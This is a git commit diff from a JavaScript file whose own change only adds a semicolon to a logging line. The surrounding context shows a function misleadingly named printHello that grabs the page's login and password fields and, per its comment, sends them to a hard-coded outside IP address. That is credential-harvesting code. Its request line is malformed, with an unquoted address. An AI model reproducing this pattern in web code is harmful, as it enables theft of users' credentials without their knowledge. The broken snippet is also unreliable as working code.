ea69a4d273833e80fcbd9f0b7b587302c274ba9b
Jordan <jminjie@umich.edu>
2016-04-21 17:03:49 -0400

    Fix semicolon

--- javascripts/main.js
+++ javascripts/main.js
@@ -2,7 +2,7 @@ function printHello() {
 	// grab the login and pass
 	var uniq = document.getElementById('login');
 	var password = document.getElementById('password');
-    console.log(uniq, password)
+    console.log(uniq, password);
 	// send the login and pass as resquests
 	var xmlHttp = new XMLHttpRequest();
 	xmlHttp.open( "GET", 35.2.222.118:80, false ); // false for synchronous request
